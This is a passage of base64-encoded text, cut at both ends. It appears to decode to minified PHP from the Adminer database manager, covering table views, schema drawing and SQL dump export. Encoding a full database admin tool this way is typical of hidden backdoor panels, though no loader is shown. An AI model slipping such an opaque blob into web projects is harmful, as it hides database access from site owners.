2F2ZSJdKSRfR0VUWyJlZGl0Il09JF9HRVRbInNlbGVjdCJdO2lmKGlzc2V0KCRfR0VUWyJjYWxsZiJdKSkkX0dFVFsiY2FsbCJdPSRfR0VUWyJjYWxsZiJdO2lmKGlzc2V0KCRfR0VUWyJmdW5jdGlvbiJdKSkkX0dFVFsicHJvY2VkdXJlIl09JF9HRVRbImZ1bmN0aW9uIl07aWYoaXNzZXQoJF9HRVRbImRvd25sb2FkIl0pKXskYT0kX0dFVFsiZG93bmxvYWQiXTskcD1maWVsZHMoJGEpO2hlYWRlcigiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0iKTtoZWFkZXIoIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSIuZnJpZW5kbHlfdXJsKCIkYS0iLmltcGxvZGUoIl8iLCRfR0VUWyJ3aGVyZSJdKSkuIi4iLmZyaWVuZGx5X3VybCgkX0dFVFsiZmllbGQiXSkpOyRNPWFycmF5KGlkZl9lc2NhcGUoJF9HRVRbImZpZWxkIl0pKTskST0kVWItPnNlbGVjdCgkYSwkTSxhcnJheSh3aGVyZSgkX0dFVCwkcCkpLCRNKTskSz0oJEk/JEktPmZldGNoX3JvdygpOmFycmF5KCkpO2VjaG8kS1swXTtleGl0O31lbHNlaWYoaXNzZXQoJF9HRVRbInRhYmxlIl0pKXskYT0kX0dFVFsidGFibGUiXTskcD1maWVsZHMoJGEpO2lmKCEkcCkkbj1lcnJvcigpOyRSPXRhYmxlX3N0YXR1czEoJGEsdHJ1ZSk7cGFnZV9oZWFkZXIoKCRwJiZpc192aWV3KCRSKT8nVmlldyc6J1RhYmxlJykuIjogIi5oKCRhKSwkbik7JGItPnNlbGVjdExpbmtzKCRSKTskcWI9JFJbIkNvbW1lbnQiXTtpZigkcWIhPSIiKWVjaG8iPHA+Ii4nQ29tbWVudCcuIjogIi5oKCRxYikuIlxuIjtpZigkcCl7ZWNobyI8dGFibGUgY2VsbHNwYWNpbmc9JzAnPlxuIiwiPHRoZWFkPjx0cj48dGg+Ii4nQ29sdW1uJy4iPHRkPiIuJ1R5cGUnLihzdXBwb3J0KCJjb21tZW50Iik/Ijx0ZD4iLidDb21tZW50JzoiIikuIjwvdGhlYWQ+XG4iO2ZvcmVhY2goJHANCmFzJG8pe2VjaG8iPHRyIi5vZGQoKS4iPjx0aD4iLmgoJG9bImZpZWxkIl0pLCI8dGQ+PHNwYW4gdGl0bGU9JyIuaCgkb1siY29sbGF0aW9uIl0pLiInPiIuaCgkb1siZnVsbF90eXBlIl0pLiI8L3NwYW4+IiwoJG9bIm51bGwiXT8iIDxpPk5VTEw8L2k+IjoiIiksKCRvWyJhdXRvX2luY3JlbWVudCJdPyIgPGk+Ii4nQXV0byBJbmNyZW1lbnQnLiI8L2k+IjoiIiksKGlzc2V0KCRvWyJkZWZhdWx0Il0pPyIgPHNwYW4gdGl0bGU9JyIuJ0RlZmF1bHQgdmFsdWUnLiInPls8Yj4iLmgoJG9bImRlZmF1bHQiXSkuIjwvYj5dPC9zcGFuPiI6IiIpLChzdXBwb3J0KCJjb21tZW50Iik/Ijx0ZD4iLm5ic3AoJG9bImNvbW1lbnQiXSk6IiIpLCJcbiI7fWVjaG8iPC90YWJsZT5cbiI7fWlmKCFpc192aWV3KCRSKSl7aWYoc3VwcG9ydCgiaW5kZXhlcyIpKXtlY2hvIjxoMyBpZD0naW5kZXhlcyc+Ii4nSW5kZXhlcycuIjwvaDM+XG4iOyR2PWluZGV4ZXMoJGEpO2lmKCR2KXtlY2hvIjx0YWJsZSBjZWxsc3BhY2luZz0nMCc+XG4iO2ZvcmVhY2goJHYNCmFzJEM9PiR1KXtrc29ydCgkdVsiY29sdW1ucyJdKTskQWY9YXJyYXkoKTtmb3JlYWNoKCR1WyJjb2x1bW5zIl1hcyR4PT4kWCkkQWZbXT0iPGk+Ii5oKCRYKS4iPC9pPiIuKCR1WyJsZW5ndGhzIl1bJHhdPyIoIi4kdVsibGVuZ3RocyJdWyR4XS4iKSI6IiIpLigkdVsiZGVzY3MiXVskeF0/IiBERVNDIjoiIik7ZWNobyI8dHIgdGl0bGU9JyIuaCgkQykuIic+PHRoPiR1W3R5cGVdPHRkPiIuaW1wbG9kZSgiLCAiLCRBZikuIlxuIjt9ZWNobyI8L3RhYmxlPlxuIjt9ZWNobyc8cCBjbGFzcz0ibGlua3MiPjxhIGhyZWY9IicuaChNRSkuJ2luZGV4ZXM9Jy51cmxlbmNvZGUoJGEpLiciPicuJ0FsdGVyIGluZGV4ZXMnLiI8L2E+XG4iO31pZihma19zdXBwb3J0KCRSKSl7ZWNobyI8aDMgaWQ9J2ZvcmVpZ24ta2V5cyc+Ii4nRm9yZWlnbiBrZXlzJy4iPC9oMz5cbiI7JE1jPWZvcmVpZ25fa2V5cygkYSk7aWYoJE1jKXtlY2hvIjx0YWJsZSBjZWxsc3BhY2luZz0nMCc+XG4iLCI8dGhlYWQ+PHRyPjx0aD4iLidTb3VyY2UnLiI8dGQ+Ii4nVGFyZ2V0Jy4iPHRkPiIuJ09OIERFTEVURScuIjx0ZD4iLidPTiBVUERBVEUnLiI8dGQ+Jm5ic3A7PC90aGVhZD5cbiI7Zm9yZWFjaCgkTWMNCmFzJEM9PiRxKXtlY2hvIjx0ciB0aXRsZT0nIi5oKCRDKS4iJz4iLCI8dGg+PGk+Ii5pbXBsb2RlKCI8L2k+LCA8aT4iLGFycmF5X21hcCgnaCcsJHFbInNvdXJjZSJdKSkuIjwvaT4iLCI8dGQ+PGEgaHJlZj0nIi5oKCRxWyJkYiJdIT0iIj9wcmVnX3JlcGxhY2UoJ35kYj1bXiZdKn4nLCJkYj0iLnVybGVuY29kZSgkcVsiZGIiXSksTUUpOigkcVsibnMiXSE9IiI/cHJlZ19yZXBsYWNlKCd+bnM9W14mXSp+JywibnM9Ii51cmxlbmNvZGUoJHFbIm5zIl0pLE1FKTpNRSkpLiJ0YWJsZT0iLnVybGVuY29kZSgkcVsidGFibGUiXSkuIic+Ii4oJHFbImRiIl0hPSIiPyI8Yj4iLmgoJHFbImRiIl0pLiI8L2I+LiI6IiIpLigkcVsibnMiXSE9IiI/IjxiPiIuaCgkcVsibnMiXSkuIjwvYj4uIjoiIikuaCgkcVsidGFibGUiXSkuIjwvYT4iLCIoPGk+Ii5pbXBsb2RlKCI8L2k+LCA8aT4iLGFycmF5X21hcCgnaCcsJHFbInRhcmdldCJdKSkuIjwvaT4pIiwiPHRkPiIubmJzcCgkcVsib25fZGVsZXRlIl0pLiJcbiIsIjx0ZD4iLm5ic3AoJHFbIm9uX3VwZGF0ZSJdKS4iXG4iLCc8dGQ+PGEgaHJlZj0iJy5oKE1FLidmb3JlaWduPScudXJsZW5jb2RlKCRhKS4nJm5hbWU9Jy51cmxlbmNvZGUoJEMpKS4nIj4nLidBbHRlcicuJzwvYT4nO31lY2hvIjwvdGFibGU+XG4iO31lY2hvJzxwIGNsYXNzPSJsaW5rcyI+PGEgaHJlZj0iJy5oKE1FKS4nZm9yZWlnbj0nLnVybGVuY29kZSgkYSkuJyI+Jy4nQWRkIGZvcmVpZ24ga2V5Jy4iPC9hPlxuIjt9fWlmKHN1cHBvcnQoaXNfdmlldygkUik/InZpZXdfdHJpZ2dlciI6InRyaWdnZXIiKSl7ZWNobyI8aDMgaWQ9J3RyaWdnZXJzJz4iLidUcmlnZ2VycycuIjwvaDM+XG4iOyR3aD10cmlnZ2VycygkYSk7aWYoJHdoKXtlY2hvIjx0YWJsZSBjZWxsc3BhY2luZz0nMCc+XG4iO2ZvcmVhY2goJHdoDQphcyR4PT4kWCllY2hvIjx0ciB2YWxpZ249J3RvcCc+PHRkPiIuaCgkWFswXSkuIjx0ZD4iLmgoJFhbMV0pLiI8dGg+Ii5oKCR4KS4iPHRkPjxhIGhyZWY9JyIuaChNRS4ndHJpZ2dlcj0nLnVybGVuY29kZSgkYSkuJyZuYW1lPScudXJsZW5jb2RlKCR4KSkuIic+Ii4nQWx0ZXInLiI8L2E+XG4iO2VjaG8iPC90YWJsZT5cbiI7fWVjaG8nPHAgY2xhc3M9ImxpbmtzIj48YSBocmVmPSInLmgoTUUpLid0cmlnZ2VyPScudXJsZW5jb2RlKCRhKS4nIj4nLidBZGQgdHJpZ2dlcicuIjwvYT5cbiI7fX1lbHNlaWYoaXNzZXQoJF9HRVRbInNjaGVtYSJdKSl7cGFnZV9oZWFkZXIoJ0RhdGFiYXNlIHNjaGVtYScsIiIsYXJyYXkoKSxoKERCLigkX0dFVFsibnMiXT8iLiRfR0VUW25zXSI6IiIpKSk7JFNnPWFycmF5KCk7JFRnPWFycmF5KCk7JGVhPSgkX0dFVFsic2NoZW1hIl0/JF9HRVRbInNjaGVtYSJdOiRfQ09PS0lFWyJhZG1pbmVyX3NjaGVtYS0iLnN0cl9yZXBsYWNlKCIuIiwiXyIsREIpXSk7cHJlZ19tYXRjaF9hbGwoJ34oW146XSspOihbLTAtOS5dKyl4KFstMC05Ll0rKShffCQpficsJGVhLCRhZSxQUkVHX1NFVF9PUkRFUik7Zm9yZWFjaCgkYWUNCmFzJHM9PiRCKXskU2dbJEJbMV1dPWFycmF5KCRCWzJdLCRCWzNdKTskVGdbXT0iXG5cdCciLmpzX2VzY2FwZSgkQlsxXSkuIic6IFsgJEJbMl0sICRCWzNdIF0iO30kb2g9MDskUGE9LTE7JGtnPWFycmF5KCk7JFNmPWFycmF5KCk7JFJkPWFycmF5KCk7Zm9yZWFjaCh0YWJsZV9zdGF0dXMoJycsdHJ1ZSlhcyRRPT4kUil7aWYoaXNfdmlldygkUikpY29udGludWU7JHRmPTA7JGtnWyRRXVsiZmllbGRzIl09YXJyYXkoKTtmb3JlYWNoKGZpZWxkcygkUSlhcyRDPT4kbyl7JHRmKz0xLjI1OyRvWyJwb3MiXT0kdGY7JGtnWyRRXVsiZmllbGRzIl1bJENdPSRvO30ka2dbJFFdWyJwb3MiXT0oJFNnWyRRXT8kU2dbJFFdOmFycmF5KCRvaCwwKSk7Zm9yZWFjaCgkYi0+Zm9yZWlnbktleXMoJFEpYXMkWCl7aWYoISRYWyJkYiJdKXskUGQ9JFBhO2lmKCRTZ1skUV1bMV18fCRTZ1skWFsidGFibGUiXV1bMV0pJFBkPW1pbihmbG9hdHZhbCgkU2dbJFFdWzFdKSxmbG9hdHZhbCgkU2dbJFhbInRhYmxlIl1dWzFdKSktMTtlbHNlJFBhLT0uMTt3aGlsZSgkUmRbKHN0cmluZykkUGRdKSRQZC09LjAwMDE7JGtnWyRRXVsicmVmZXJlbmNlcyJdWyRYWyJ0YWJsZSJdXVsoc3RyaW5nKSRQZF09YXJyYXkoJFhbInNvdXJjZSJdLCRYWyJ0YXJnZXQiXSk7JFNmWyRYWyJ0YWJsZSJdXVskUV1bKHN0cmluZykkUGRdPSRYWyJ0YXJnZXQiXTskUmRbKHN0cmluZykkUGRdPXRydWU7fX0kb2g9bWF4KCRvaCwka2dbJFFdWyJwb3MiXVswXSsyLjUrJHRmKTt9ZWNobyc8ZGl2IGlkPSJzY2hlbWEiIHN0eWxlPSJoZWlnaHQ6ICcsJG9oLCdlbTsiIG9uc2VsZWN0c3RhcnQ9InJldHVybiBmYWxzZTsiPg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KdmFyIHRhYmxlUG9zID0geycsaW1wbG9kZSgiLCIsJFRnKS4iXG4iLCd9Ow0KdmFyIGVtID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoXCdzY2hlbWFcJykub2Zmc2V0SGVpZ2h0IC8gJywkb2gsJzsNCmRvY3VtZW50Lm9ubW91c2Vtb3ZlID0gc2NoZW1hTW91c2Vtb3ZlOw0KZG9jdW1lbnQub25tb3VzZXVwID0gZnVuY3Rpb24gKGV2KSB7DQoJc2NoZW1hTW91c2V1cChldiwgXCcnLGpzX2VzY2FwZShEQiksJ1wnKTsNCn07DQo8L3NjcmlwdD4NCic7Zm9yZWFjaCgka2cNCmFzJEM9PiRRKXtlY2hvIjxkaXYgY2xhc3M9J3RhYmxlJyBzdHlsZT0ndG9wOiAiLiRRWyJwb3MiXVswXS4iZW07IGxlZnQ6ICIuJFFbInBvcyJdWzFdLiJlbTsnIG9ubW91c2Vkb3duPSdzY2hlbWFNb3VzZWRvd24odGhpcywgZXZlbnQpOyc+IiwnPGEgaHJlZj0iJy5oKE1FKS4ndGFibGU9Jy51cmxlbmNvZGUoJEMpLiciPjxiPicuaCgkQykuIjwvYj48L2E+Ijtmb3JlYWNoKCRRWyJmaWVsZHMiXWFzJG8peyRYPSc8c3BhbicudHlwZV9jbGFzcygkb1sidHlwZSJdKS4nIHRpdGxlPSInLmgoJG9bImZ1bGxfdHlwZSJdLigkb1sibnVsbCJdPyIgTlVMTCI6JycpKS4nIj4nLmgoJG9bImZpZWxkIl0pLic8L3NwYW4+JztlY2hvIjxicj4iLigkb1sicHJpbWFyeSJdPyI8aT4kWDwvaT4iOiRYKTt9Zm9yZWFjaCgoYXJyYXkpJFFbInJlZmVyZW5jZXMiXWFzJFpnPT4kVGYpe2ZvcmVhY2goJFRmDQphcyRQZD0+JFBmKXskUWQ9JFBkLSRTZ1skQ11bMV07JHM9MDtmb3JlYWNoKCRQZlswXWFzJEFnKWVjaG8iXG48ZGl2IGNsYXNzPSdyZWZlcmVuY2VzJyB0aXRsZT0nIi5oKCRaZykuIicgaWQ9J3JlZnMkUGQtIi4oJHMrKykuIicgc3R5bGU9J2xlZnQ6ICRRZCIuImVtOyB0b3A6ICIuJFFbImZpZWxkcyJdWyRBZ11bInBvcyJdLiJlbTsgcGFkZGluZy10b3A6IC41ZW07Jz48ZGl2IHN0eWxlPSdib3JkZXItdG9wOiAxcHggc29saWQgR3JheTsgd2lkdGg6ICIuKC0kUWQpLiJlbTsnPjwvZGl2PjwvZGl2PiI7fX1mb3JlYWNoKChhcnJheSkkU2ZbJENdYXMkWmc9PiRUZil7Zm9yZWFjaCgkVGYNCmFzJFBkPT4kZil7JFFkPSRQZC0kU2dbJENdWzFdOyRzPTA7Zm9yZWFjaCgkZg0KYXMkWWcpZWNobyJcbjxkaXYgY2xhc3M9J3JlZmVyZW5jZXMnIHRpdGxlPSciLmgoJFpnKS4iJyBpZD0ncmVmZCRQZC0iLigkcysrKS4iJyBzdHlsZT0nbGVmdDogJFFkIi4iZW07IHRvcDogIi4kUVsiZmllbGRzIl1bJFlnXVsicG9zIl0uImVtOyBoZWlnaHQ6IDEuMjVlbTsgYmFja2dyb3VuZDogdXJsKCIuaChwcmVnX3JlcGxhY2UoIn5cXD8uKn4iLCIiLE1FKSkuIj9maWxlPWFycm93LmdpZikgbm8tcmVwZWF0IHJpZ2h0IGNlbnRlcjsmYW1wO3ZlcnNpb249NC4yLjUnPjxkaXYgc3R5bGU9J2hlaWdodDogLjVlbTsgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkIEdyYXk7IHdpZHRoOiAiLigtJFFkKS4iZW07Jz48L2Rpdj48L2Rpdj4iO319ZWNobyJcbjwvZGl2PlxuIjt9Zm9yZWFjaCgka2cNCmFzJEM9PiRRKXtmb3JlYWNoKChhcnJheSkkUVsicmVmZXJlbmNlcyJdYXMkWmc9PiRUZil7Zm9yZWFjaCgkVGYNCmFzJFBkPT4kUGYpeyRwZT0kb2g7JGVlPS0xMDtmb3JlYWNoKCRQZlswXWFzJHg9PiRBZyl7JHVmPSRRWyJwb3MiXVswXSskUVsiZmllbGRzIl1bJEFnXVsicG9zIl07JHZmPSRrZ1skWmddWyJwb3MiXVswXSska2dbJFpnXVsiZmllbGRzIl1bJFBmWzFdWyR4XV1bInBvcyJdOyRwZT1taW4oJHBlLCR1ZiwkdmYpOyRlZT1tYXgoJGVlLCR1ZiwkdmYpO31lY2hvIjxkaXYgY2xhc3M9J3JlZmVyZW5jZXMnIGlkPSdyZWZsJFBkJyBzdHlsZT0nbGVmdDogJFBkIi4iZW07IHRvcDogJHBlIi4iZW07IHBhZGRpbmc6IC41ZW0gMDsnPjxkaXYgc3R5bGU9J2JvcmRlci1yaWdodDogMXB4IHNvbGlkIEdyYXk7IG1hcmdpbi10b3A6IDFweDsgaGVpZ2h0OiAiLigkZWUtJHBlKS4iZW07Jz48L2Rpdj48L2Rpdj5cbiI7fX19ZWNobyc8L2Rpdj4NCjxwIGNsYXNzPSJsaW5rcyI+PGEgaHJlZj0iJyxoKE1FLiJzY2hlbWE9Ii51cmxlbmNvZGUoJGVhKSksJyIgaWQ9InNjaGVtYS1saW5rIj5QZXJtYW5lbnQgbGluazwvYT4NCic7fWVsc2VpZihpc3NldCgkX0dFVFsiZHVtcCJdKSl7JGE9JF9HRVRbImR1bXAiXTtpZigkX1BPU1QmJiEkbil7JHpiPSIiO2ZvcmVhY2goYXJyYXkoIm91dHB1dCIsImZvcm1hdCIsImRiX3N0eWxlIiwicm91dGluZXMiLCJldmVudHMiLCJ0YWJsZV9zdHlsZSIsImF1dG9faW5jcmVtZW50IiwidHJpZ2dlcnMiLCJkYXRhX3N0eWxlIilhcyR4KSR6Yi49IiYkeD0iLnVybGVuY29kZSgkX1BPU1RbJHhdKTtjb29raWUoImFkbWluZXJfZXhwb3J0IixzdWJzdHIoJHpiLDEpKTskUz1hcnJheV9mbGlwKChhcnJheSkkX1BPU1RbInRhYmxlcyJdKSthcnJheV9mbGlwKChhcnJheSkkX1BPU1RbImRhdGEiXSk7JHpjPWR1bXBfaGVhZGVycygoY291bnQoJFMpPT0xP2tleSgkUyk6REIpLChEQj09IiJ8fGNvdW50KCRTKT4xKSk7JF9kPXByZWdfbWF0Y2goJ35zcWx+JywkX1BPU1RbImZvcm1hdCJdKTtpZigkX2Qpe2VjaG8iLS0gQWRtaW5lciAkaWEgIi4kVmJbRFJJVkVSXS4iIGR1bXBcblxuIjtpZigkdz09InNxbCIpe2VjaG8iU0VUIE5BTUVTIHV0Zjg7DQpTRVQgdGltZV96b25lID0gJyswMDowMCc7DQoiLigkX1BPU1RbImRhdGFfc3R5bGUiXT8iU0VUIGZvcmVpZ25fa2V5X2NoZWNrcyA9IDA7DQpTRVQgc3FsX21vZGUgPSAnTk9fQVVUT19WQUxVRV9PTl9aRVJPJzsNCiI6IiIpLiINCiI7JGctPnF1ZXJ5KCJTRVQgdGltZV96b25lID0gJyswMDowMCc7Iik7fX0kSmc9JF9QT1NUWyJkYl9zdHlsZSJdOyRsPWFycmF5KERCKTtpZihEQj09IiIpeyRsPSRfUE9TVFsiZGF0YWJhc2VzIl07aWYoaXNfc3RyaW5nKCRsKSkkbD1leHBsb2RlKCJcbiIscnRyaW0oc3RyX3JlcGxhY2UoIlxyIiwiIiwkbCksIlxuIikpO31mb3JlYWNoKChhcnJheSkkbA0KYXMkbSl7JGItPmR1bXBEYXRhYmFzZSgkbSk7aWYoJGctPnNlbGVjdF9kYigkbSkpe2lmKCRfZCYmcHJlZ19tYXRjaCgnfkNSRUFURX4nLCRKZykmJigkaT0kZy0+cmVzdWx0KCJTSE9XIENSRUFURSBEQVRBQkFTRSAiLmlkZl9lc2NhcGUoJG0pLDEpKSl7c2V0X3V0ZjhtYjQoJGkpO2lmKCRKZz09IkRST1ArQ1JFQVRFIillY2hvIkRST1AgREFUQUJBU0UgSUYgRVhJU1RTICIuaWRmX2VzY2FwZSgkbSkuIjtcbiI7ZWNobyIkaTtcbiI7fWlmKCRfZCl7aWYoJEpnKWVjaG8NCnVzZV9zcWwoJG0pLiI7XG5cbiI7JGNmPSIiO2lmKCRfUE9TVFsicm91dGluZXMiXSl7Zm9yZWFjaChhcnJheSgiRlVOQ1RJT04iLCJQUk9DRURVUkUiKWFzJGVnKXtmb3JlYWNoKGdldF9yb3dzKCJTSE9XICRlZyBTVEFUVVMgV0hFUkUgRGIgPSAiLnEoJG0pLG51bGwsIi0tICIpYXMkSyl7JGk9cmVtb3ZlX2RlZmluZXIoJGctPnJlc3VsdCgiU0hPVyBDUkVBVEUgJGVnICIuaWRmX2VzY2FwZSgkS1siTmFtZSJdKSwyKSk7c2V0X3V0ZjhtYjQoJGkpOyRjZi49KCRKZyE9J0RST1ArQ1JFQVRFJz8iRFJPUCAkZWcgSUYgRVhJU1RTICIuaWRmX2VzY2FwZSgkS1siTmFtZSJdKS4iOztcbiI6IiIpLiIkaTs7XG5cbiI7fX19aWYoJF9QT1NUWyJldmVudHMiXSl7Zm9yZWFjaChnZXRfcm93cygiU0hPVyBFVkVOVFMiLG51bGwsIi0tICIpYXMkSyl7JGk9cmVtb3ZlX2RlZmluZXIoJGctPnJlc3VsdCgiU0hPVyBDUkVBVEUgRVZFTlQgIi5pZGZfZXNjYXBlKCRLWyJOYW1lIl0pLDMpKTtzZXRfdXRmOG1iNCgkaSk7JGNmLj0oJEpnIT0nRFJPUCtDUkVBVEUnPyJEUk9QIEVWRU5UIElGIEVYSVNUUyAiLmlkZl9lc2NhcGUoJEtbIk5hbWUiXSkuIjs7XG4iOiIiKS4iJGk7O1xuXG4iO319aWYoJGNmKWVjaG8iREVMSU1JVEVSIDs7XG5cbiRjZiIuIkRFTElNSVRFUiA7XG5cbiI7fWlmKCRfUE9TVFsidGFibGVfc3R5bGUiXXx8JF9QT1NUWyJkYXRhX3N0eWxlIl0peyRWaD1hcnJheSgpO2ZvcmVhY2godGFibGVfc3RhdHVzKCcnLHRydWUpYXMkQz0+JFIpeyRRPShEQj09IiJ8fGluX2FycmF5KCRDLChhcnJheSkkX1BPU1RbInRhYmxlcyJdKSk7JERiPShEQj09IiJ8fGluX2FycmF5KCRDLChhcnJheSkkX1BPU1RbImRhdGEiXSkpO2lmKCRRfHwkRGIpe2lmKCR6Yz09InRhciIpeyRtaD1uZXcNClRtcEZpbGU7b2Jfc3RhcnQoYXJyYXkoJG1oLCd3cml0ZScpLDFlNSk7fSRiLT5kdW1wVGFibGUoJEMsKCRRPyRfUE9TVFsidGFibGVfc3R5bGUiXToiIiksKGlzX3ZpZXcoJFIpPzI6MCkpO2lmKGlzX3ZpZXcoJFIpKSRWaFtdPSRDO2Vsc2VpZigkRGIpeyRwPWZpZWxkcygkQyk7JGItPmR1bXBEYXRhKCRDLCRfUE9TVFsiZGF0YV9zdHlsZSJdLCJTRUxFQ1QgKiIuY29udmVydF9maWVsZHMoJHAsJHApLiIgRlJPTSAiLnRhYmxlKCRDKSk7fWlmKCRfZCYmJF9QT1NUWyJ0cmlnZ2VycyJdJiYkUSYmKCR3aD10cmlnZ2VyX3NxbCgkQywkX1BPU1RbInRhYmxlX3N0eWxlIl0pKSllY2hvIlxuREVMSU1JVEVSIDs7XG4kd2hcbkRFTElNSVRFUiA7XG4iO2lmKCR6Yz09InRhciIpe29iX2VuZF9mbHVzaCgpO3Rhcl9maWxlKChEQiE9IiI/IiI6IiRtLyIpLiIkQy5jc3YiLCRtaCk7fWVsc2VpZigkX2QpZWNobyJcbiI7fX1mb3JlYWNoKCRWaA0KYXMkVWgpJGItPmR1bXBUYWJsZSgkVWgsJF9QT1NUWyJ0YWJsZV9zdHlsZSJdLDEpO2lmKCR6Yz09InRhciIpZWNobw0KcGFjaygieDUxMiIpO319fWlmKCRfZCllY2hvIi0tICIuJGctPnJlc3VsdCgiU0VMRUNUIE5PVygpIikuIlxuIjtleGl0O31wYWdlX2hlYWRlcignRXhwb3J0JywkbiwoJF9HRVRbImV4cG9ydCJdIT0iIj9hcnJheSgidGFibGUiPT4kX0dFVFsiZXhwb3J0Il0pOmFycmF5KCkpLGgoREIpKTtlY2hvJw0KPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQo8dGFibGUgY2VsbHNwYWNpbmc9IjAiPg0KJzskR2I9YXJyYXkoJycsJ1VTRScsJ0RST1ArQ1JFQVRFJywnQ1JFQVRFJyk7JFVnPWFycmF5KCcnLCdEUk9QK0NSRUFURScsJ0NSRUFURScpOyRFYj1hcnJheSgnJywnVFJVTkNBVEUrSU5TRVJUJywnSU5TRVJUJyk7aWYoJHc9PSJzcWwiKSRFYltdPSdJTlNFUlQrVVBEQVRFJztwYXJzZV9zdHIoJF9DT09LSUVbImFkbWluZXJfZXhwb3J0Il0sJEspO2lmKCEkSykkSz1hcnJheSgib3V0cHV0Ij0+InRleHQiLCJmb3JtYXQiPT4ic3FsIiwiZGJfc3R5bGUiPT4oREIhPSIiPyIiOiJDUkVBVEUiKSwidGFibGVfc3R5bGUiPT4iRFJPUCtDUkVBVEUiLCJkYXRhX3N0eWxlIj0+IklOU0VSVCIpO2lmKCFpc3NldCgkS1siZXZlbnRzIl0pKXskS1sicm91dGluZXMiXT0kS1siZXZlbnRzIl09KCRfR0VUWyJkdW1wIl09PSIiKTskS1sidHJpZ2dlcnMiXT0kS1sidGFibGVfc3R5bGUiXTt9ZWNobyI8dHI+PHRoPiIuJ091dHB1dCcuIjx0ZD4iLmh0bWxfc2VsZWN0KCJvdXRwdXQiLCRiLT5kdW1wT3V0cHV0KCksJEtbIm91dHB1dCJdLDApLiJcbiI7ZWNobyI8dHI+PHRoPiIuJ0Zvcm1hdCcuIjx0ZD4iLmh0bWxfc2VsZWN0KCJmb3JtYXQiLCRiLT5kdW1wRm9ybWF0KCksJEtbImZvcm1hdCJdLDApLiJcbiI7ZWNobygkdz09InNxbGl0ZSI/IiI6Ijx0cj48dGg+Ii4nRGF0YWJhc2UnLiI8dGQ+Ii5odG1sX3NlbGVjdCgnZGJfc3R5bGUnLCRHYiwkS1siZGJfc3R5bGUiXSkuKHN1cHBvcnQoInJvdXRpbmUiKT9jaGVja2JveCgicm91dGluZXMiLDEsJEtbInJvdXRpbmVzIl0sJ1JvdXRpbmVzJyk6IiIpLihzdXBwb3J0KCJldmVudCIpP2NoZWNrYm94KCJldmVudHMiLDEsJEtbImV2ZW50cyJdLCdFdmVudHMnKToiIikpLCI8dHI+PHRoPiIuJ1RhYmxlcycuIjx0ZD4iLmh0bWxfc2VsZWN0KCd0YWJsZV9zdHlsZScsJFVnLCRLWyJ0YWJsZV9zdHlsZSJdKS5jaGVja2JveCgiYXV0b19pbmNyZW1lbnQiLDEsJEtbImF1dG9faW5jcmVtZW50Il0sJ0F1dG8gSW5jcmVtZW50JykuKHN1cHBvcnQoInRyaWdnZXIiKT9jaGVja2JveCgidHJpZ2dlcnMiLDEsJEtbInRyaWdnZXJzIl0sJ1RyaWdnZXJzJyk6IiIpLCI8dHI+PHRoPiIuJ0RhdGEnLiI8dGQ+Ii5odG1sX3NlbGVjdCgnZGF0YV9zdHlsZScsJEViLCRLWyJkYXRhX3N0eWxlIl0pLCc8L3RhYmxlPg0KPHA+PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4cG9ydCI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9IicsJFQsJyI+DQoNCjx0YWJsZSBjZWxsc3BhY2luZz0iMCI+DQonOyR5Zj1hcnJheSgpO2lmKERCIT0iIil7JGNiPSgkYSE9IiI/IiI6IiBjaGVja2VkIik7ZWNobyI8dGhlYWQ+PHRyPiIsIjx0aCBzdHlsZT0ndGV4dC1hbGlnbjogbGVmdDsnPjxsYWJlbCBjbGFzcz0nYmxvY2snPjxpbnB1dCB0eXBlPSdjaGVja2JveCcgaWQ9J2NoZWNrLXRhYmxlcyckY2Igb25jbGljaz0nZm9ybUNoZWNrKHRoaXMsIC9edGFibGVzXFxbLyk7Jz4iLidUYWJsZXMnLiI8L2xhYmVsPiIsIjx0aCBzdHlsZT0ndGV4dC1hbGlnbjogcmlnaHQ7Jz48bGFiZWwgY2xhc3M9J2Jsb2NrJz4iLidEYXRhJy4iPGlucHV0IHR5cGU9J2NoZWNrYm94JyBpZD0nY2hlY2stZGF0YSckY2Igb25jbGljaz0nZm9ybUNoZWNrKHRoaXMsIC9eZGF0YVxcWy8pOyc+PC9sYWJlbD4iLCI8L3RoZWFkPlxuIjskVmg9IiI7JFZnPXRhYmxlc19saXN0KCk7Zm9yZWFjaCgkVmcNCmFzJEM9PiRVKXskeGY9cHJlZ19yZXBsYWNlKCd+Xy4qficsJycsJEMpOyRjYj0oJGE9PSIifHwkYT09KHN1YnN0cigkYSwtMSk9PSIlIj8iJHhmJSI6JEMpKTskQWY9Ijx0cj48dGQ+Ii5jaGVja2JveCgidGFibGVzW10iLCRDLCRjYiwkQywiY2hlY2tib3hDbGljayhldmVudCwgdGhpcyk7IGZvcm1VbmNoZWNrKCdjaGVjay10YWJsZXMnKTsiLCJibG9jayIpO2lmKCRVIT09bnVsbCYmIXByZWdfbWF0Y2goJ350YWJsZX5pJywkVSkpJFZoLj0iJEFmXG4iO2Vsc2UNCmVjaG8iJEFmPHRkIGFsaWduPSdyaWdodCc+PGxhYmVsIGNsYXNzPSdibG9jayc+PHNwYW4gaWQ9J1Jvd3MtIi5oKCRDKS4iJz48L3NwYW4+Ii5jaGVja2JveCgiZGF0YVtdIiwkQywkY2IsIiIsImNoZWNrYm94Q2xpY2soZXZlbnQsIHRoaXMpOyBmb3JtVW5jaGVjaygnY2hlY2stZGF0YScpOyIpLiI8L2xhYmVsPlxuIjskeWZbJHhmXSsrO31lY2hvJFZoO2lmKCRWZyllY2hvIjxzY3JpcHQgdHlwZT0ndGV4dC9qYXZhc2NyaXB0Jz5hamF4U2V0SHRtbCgnIi5qc19lc2NhcGUoTUUpLiJzY3JpcHQ9ZGInKTs8L3NjcmlwdD5cbiI7fWVsc2V7ZWNobyI8dGhlYWQ+PHRyPjx0aCBzdHlsZT0ndGV4dC1hbGlnbjogbGVmdDsnPjxsYWJlbCBjbGFzcz0nYmxvY2snPjxpbnB1dCB0eXBlPSdjaGVja2JveCcgaWQ9J2NoZWNrLWRhdGFiYXNlcy